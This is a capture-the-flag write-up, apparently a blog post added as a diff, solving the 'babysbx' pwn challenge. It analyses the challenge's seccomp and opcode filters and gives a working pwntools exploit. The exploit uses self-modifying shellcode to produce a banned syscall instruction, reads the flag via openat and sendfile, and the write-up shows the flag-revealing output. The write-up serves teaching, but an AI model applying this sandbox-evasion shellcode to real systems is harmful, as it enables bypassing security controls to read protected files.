@@ -1,0 +1,414 @@
+---
+title: AOFCTF '24 - Pwn - Babysbx
+date: '2024-04-29'
+tags: ['pwn', 'aofctf', 'seccomp', 'mov', 'sandbox', 'syscall']
+draft: false
+summary: Bypassing Seccomp rules and instructions check to read the flag file. No mov, no syscall/int 0x80, sysenter allowed.
+---
+
+## Challenge Description
+
+![alt text](/static/writeups/aofctf-24/image-12.png)
+
+## Solution
+
+The followings files were provided in the tarball:
+
+```bash
+$ tar -tf babysbx.tar
+babysbx
+Dockerfile
+flag.txt
+```
+
+Let's firstly see the Dockerfile:
+
+```dockerfile
+FROM theflash2k/pwn-chal:seccomp
+
+ENV CHAL_NAME=babysbx
+
+COPY ${CHAL_NAME} .
+COPY flag.txt /truly-the-flag
+
+EXPOSE 8000
+```
+
+Now, we can see that the flag is being copied into `/truly-the-flag` and the `seccomp` image is being used. Let's run `seccomp-tools` to find the constraints:
+
+```bash
+$ seccomp-tools dump ./babysbx                                                                  ✖ ✹ ✭main ‹ruby-3.0.5›
+Give me your shellcode: asd
+==> Validating shellcode so it doesn't contain any invalid instruction.
+Shellcode looks clean. Invoking..
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x09 0xffffffff  if (A != 0xffffffff) goto 0014
+ 0005: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0014
+ 0006: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0014
+ 0007: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0014
+ 0008: 0x15 0x05 0x00 0x0000003b  if (A == execve) goto 0014
+ 0009: 0x15 0x04 0x00 0x000000bb  if (A == readahead) goto 0014
+ 0010: 0x15 0x03 0x00 0x0000010b  if (A == readlinkat) goto 0014
+ 0011: 0x15 0x02 0x00 0x00000127  if (A == preadv) goto 0014
+ 0012: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+Well, we cannot get a shell, but we already know the flag is at `/truly-the-flag`, so what we can do is simply use `openat` instruction, and then we can use `sendfile` to get data from the opened file descriptor, to the stdout.
+
+However, in the above output, there's a line that's sus:
+
+```bash
+==> Validating shellcode so it doesn't contain any invalid instruction.
+```
+
+Well, there seems to be some sort of filtering, let's check this out in a decompiler:
+
+```c:main
+undefined8 main(void)
+
+{
+  int iVar1;
+  code *__s;
+
+  __s = (code *)mmap((void *)0xdead0000,0x1000,7,0x21,-1,0);
+  memset(__s,0,0x1000);
+  printf("Give me your shellcode: ");
+  read(0,__s,0x1000);
+  puts("==> Validating shellcode so it doesn\'t contain any invalid instruction.");
+  iVar1 = validate(__s,0x1000);
+  if (iVar1 != 0) {
+    puts("Nope. Can\'t run this shellcode.");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  puts("Shellcode looks clean. Invoking..");
+  init_sbx();
+  init_reg();
+  (*__s)();
+  return 0;
+}
+```
+
+Okay, so we can see that with our input, the `validate` function is being called:
+
+```c:validate
+
+undefined8 validate(long param_1,int param_2)
+
+{
+  undefined *__s2;
+  long lVar1;
+  undefined *puVar2;
+  int iVar3;
+  ulong uVar4;
+  undefined8 uVar5;
+  void *__src;
+  size_t sVar6;
+  undefined *puVar7;
+  long in_FS_OFFSET;
+  undefined auStack_c8 [4];
+  int local_c4;
+  long local_c0;
+  short local_aa;
+  uint local_a8;
+  int local_a4;
+  int local_a0;
+  int local_9c;
+  long local_98;
+  undefined *local_90;
+  undefined *local_88 [4];
+  undefined8 local_68;
+  undefined8 local_60;
+  undefined8 local_58;
+  undefined4 local_50;
+  undefined2 local_4c;
+  long local_40;
+
+  local_c0 = param_1;
+  local_c4 = param_2;
+  local_40 = *(long *)(in_FS_OFFSET + 0x28);
+  local_aa = 2;
+  for (local_9c = 0; local_9c < 0xfff; local_9c = local_9c + 1) {
+    local_88[0] = &DAT_00102008;
+    local_88[1] = &DAT_0010200b;
+    local_88[2] = &DAT_0010200e;
+    local_98 = (long)(local_aa + 1) + -1;
+    uVar4 = (((long)(local_aa + 1) + 0xfU) / 0x10) * 0x10;
+    for (puVar7 = auStack_c8; puVar7 != auStack_c8 + -(uVar4 & 0xfffffffffffff000);
+        puVar7 = puVar7 + -0x1000) {
+      *(undefined8 *)(puVar7 + -8) = *(undefined8 *)(puVar7 + -8);
+    }
+    lVar1 = -(ulong)((uint)uVar4 & 0xfff);
+    if ((uVar4 & 0xfff) != 0) {
+      *(undefined8 *)(puVar7 + ((ulong)((uint)uVar4 & 0xfff) - 8) + lVar1) =
+           *(undefined8 *)(puVar7 + ((ulong)((uint)uVar4 & 0xfff) - 8) + lVar1);
+    }
+    iVar3 = (int)local_aa;
+    local_90 = puVar7 + lVar1;
+    *(undefined8 *)(puVar7 + lVar1 + -8) = 0x1014dc;
+    memset(puVar7 + lVar1,0,(long)(iVar3 + 1));
+    puVar2 = local_90;
+    sVar6 = (size_t)local_aa;
+    __src = (void *)(local_9c + local_c0);
+    *(undefined8 *)(puVar7 + lVar1 + -8) = 0x101509;
+    memcpy(puVar2,__src,sVar6);
+    for (local_a0 = 0; puVar2 = local_90, local_a0 < 3; local_a0 = local_a0 + 1) {
+      sVar6 = (size_t)local_aa;
+      __s2 = local_88[local_a0];
+      *(undefined8 *)(puVar7 + lVar1 + -8) = 0x10153c;
+      iVar3 = memcmp(puVar2,__s2,sVar6);
+      if (iVar3 == 0) {
+        *(undefined8 *)(puVar7 + lVar1 + -8) = 0x10154c;
+        puts("Invalid instruction(s) found!");
+        uVar5 = 1;
+        goto LAB_00101638;
+      }
+    }
+  }
+  local_68 = 0xa1a08e8c8b8a8988;
+  local_60 = 0xb3b2b1b0a5a4a3a2;
+  local_58 = 0xbbbab9b8b7b6b5b4;
+  local_50 = 0xbfbebdbc;
+  local_4c = 0xc7c6;
+  local_a4 = 0;
+  do {
+    if (local_c4 <= local_a4) {
+      uVar5 = 0;
+LAB_00101638:
+      if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+        __stack_chk_fail();
+      }
+      return uVar5;
+    }
+    for (local_a8 = 0; local_a8 < 0x1e; local_a8 = local_a8 + 1) {
+      if (*(char *)(local_c0 + local_a4) == *(char *)((long)&local_68 + (long)(int)local_a8)) {
+        puts("Invalid instruction(s) found!");
+        uVar5 = 1;
+        goto LAB_00101638;
+      }
+    }
+    local_a4 = local_a4 + 1;
+  } while( true );
+}
+```
+
+Well, the decompilation seems daunting at first but let's break this down:
+
+```c
+  for (local_9c = 0; local_9c < 0xfff; local_9c = local_9c + 1) {
+    local_88[0] = &DAT_00102008;
+    local_88[1] = &DAT_0010200b;
+    local_88[2] = &DAT_0010200e;
+```
+
+Looking at these in the data section:
+
+```bash
+                             DAT_00102008                                    XREF[2]:     validate:001013ce(*),
+                                                                                          validate:001013d5(*)
+        00102008 cd              ??         CDh
+        00102009 80              ??         80h
+        0010200a 00              ??         00h
+                             DAT_0010200b                                    XREF[2]:     validate:001013d9(*),
+                                                                                          validate:001013e0(*)
+        0010200b 0f              ??         0Fh
+        0010200c 05              ??         05h
+        0010200d 00              ??         00h
+                             DAT_0010200e                                    XREF[2]:     validate:001013e4(*),
+                                                                                          validate:001013eb(*)
+        0010200e 0f              ??         0Fh
+        0010200f 34              ??         34h    4
+        00102010 00              ??         00h
+
+```
+
+We can see that `cd 80`, `0f 05` and `0f 34` are opcodes for `int 0x80`, `syscall`, and `sysenter` instruction respectively. We can also check this on [defuse](https://defuse.ca/online-x86-assembler.htm#disassembly)
+
+![alt text](/static/writeups/aofctf-24/image-16.png)
+
+To sum up the first nested for loops, it's basically checking if there are any `int 0x80`, `syscall` or `sysenter` instruction, then it simply blocks them.
+
+```c
+local_68 = 0xa1a08e8c8b8a8988;
+local_60 = 0xb3b2b1b0a5a4a3a2;
+local_58 = 0xbbbab9b8b7b6b5b4;
+local_50 = 0xbfbebdbc;
+local_4c = 0xc7c6;
+local_a4 = 0;
+do {
+  if (local_c4 <= local_a4) {
+    uVar5 = 0;
+LAB_00101638:
+    if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
+                  /* WARNING: Subroutine does not return */
+      __stack_chk_fail();
+    }
+    return uVar5;
+  }
+  for (local_a8 = 0; local_a8 < 0x1e; local_a8 = local_a8 + 1) {
+    if (*(char *)(local_c0 + local_a4) == *(char *)((long)&local_68 + (long)(int)local_a8)) {
+      puts("Invalid instruction(s) found!");
+      uVar5 = 1;
+      goto LAB_00101638;
+    }
+  }
+  local_a4 = local_a4 + 1;
+} while( true );
+```
+
+Now this seems more complicated, for this we'll make use of gdb, we'll also setup a barebones exploit script:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+exe = "./babysbx"
+elf = context.binary = ELF(exe)
+io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
+if args.GDB: gdb.attach(io,
+    """
+    b *main+212
+    b *validate+519
+    """)
+
+sc = asm(f"""
+    mov eax, 0
+""")
+
+io.sendafter(b"shellcode: ", sc)
+io.interactive()
+```
+
+This will simply send `mov eax, 0` and if invoked with `GDB` would setup break points on the shellcode execution and validate function, where the next verification happens:
+
+![alt text](/static/writeups/aofctf-24/image-17.png)
+
+We can see that each byte in the shellcode is being compared with:
+
+```bash
+0xa1a08e8c8b8a8988
+0xb3b2b1b0a5a4a3a2
+0xbbbab9b8b7b6b5b4
+0xbfbebdbc
+0xc7c6
+```
+
+If we were to put these instructions in defuse, they wouldn't make sense as a _blob_, however, we if we were to check opcodes, with sites such as [x86asm.net](http://ref.x86asm.net/coder32.html), we'd come to know that the blocked instructions are `mov`, `movsx` and all other variants of `mov`. So, we're restricted to no syscall, and no mov instructions.
+
+Let's analyze the other two functions `init_sbx` and `init_regs`
+
+```c:init_sbx
+void init_sbx(void)
+
+{
+  long lVar1;
+
+  lVar1 = seccomp_init(0x7fff0000);
+  if (lVar1 == 0) {
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  seccomp_rule_add(lVar1,0,2,0);
+  seccomp_rule_add(lVar1,0,0x3b,0);
+  seccomp_rule_add(lVar1,0,1,0);
+  seccomp_rule_add(lVar1,0,0,0);
+  seccomp_rule_add(lVar1,0,0x10b,0);
+  seccomp_rule_add(lVar1,0,0x142,0);
+  seccomp_rule_add(lVar1,0,0x127,0);
+  seccomp_rule_add(lVar1,0,0xbb,0);
+  seccomp_load(lVar1);
+  return;
+}
+```
+
+So, this function simply sets up the `SECCOMP` rules.
+
+```bash:init_regs
+        0010165b f3 0f 1e fa     ENDBR64
+        0010165f 55              PUSH       RBP
+        00101660 48 89 e5        MOV        RBP,RSP
+        00101663 48 31 db        XOR        RBX,RBX
+        00101666 48 31 c9        XOR        RCX,RCX
+        00101669 48 31 d2        XOR        RDX,RDX
+        0010166c 48 31 ff        XOR        RDI,RDI
+        0010166f 48 31 f6        XOR        RSI,RSI
+        00101672 4d 31 c0        XOR        R8,R8
+        00101675 4d 31 c9        XOR        R9,R9
+        00101678 4d 31 d2        XOR        R10,R10
+        0010167b 4d 31 db        XOR        R11,R11
+        0010167e 4d 31 e4        XOR        R12,R12
+        00101681 4d 31 ed        XOR        R13,R13
+        00101684 4d 31 f6        XOR        R14,R14
+        00101687 4d 31 ff        XOR        R15,R15
+        0010168a 90              NOP
+        0010168b 5d              POP        RBP
+        0010168c c3              RET
+
+```
+
+The diassembly shows that all registers are nulled out.
+
+## Exploitation
+
+We know that we cannot use `syscall`, `int 0x80`, `sysenter` and any sort of `mov` instruction. And also, the flag is in `/truly-the-flag`. So, this is the final exploit that I came up with:
+
+```py
+syscall = """
+    inc BYTE PTR [rip]
+    .word 0x050e
+"""
+
+sc = asm(f"""
+    /* load /truly-the-flag into rsi */
+    or rbx, flag[rip]
+    or rcx, flag+8[rip]
+    push rcx
+    push rbx
+    lea rsi, [rsp]
+
+    /* openat */
+    xor rax, rax
+    add rax, 0x101
+    {syscall}
+
+    /* sendfile */
+    push 0x01
+    pop rdi
+    push rax
+    pop rsi
+    add r10, 0x1000
+    xor rax, rax
+    add rax, 0x28
+    {syscall}
+
+flag:
+    .string "/truly-the-flag"
+""")
+```
+
+The `syscall` part is pretty simple. We're simply writing `0x050e` (since `0x050f` is banned), and we're simply incrementing the value before the instruction is executed so it becomes `0x050f` i.e. syscall.
+
+```bash
+$ ./exploit.py REMOTE challs.airoverflow.com 34304
+[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/babysbx/babysbx'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to challs.airoverflow.com on port 34304: Done
+[*] Switching to interactive mode
+==> Validating shellcode so it doesn't contain any invalid instruction.
+Shellcode looks clean. Invoking..
+AOFCTF{n0_m0v_n0_sysc4ll_n0_pr0bl3m_6PLcJGOP6KWTjyqYpQ}
+```
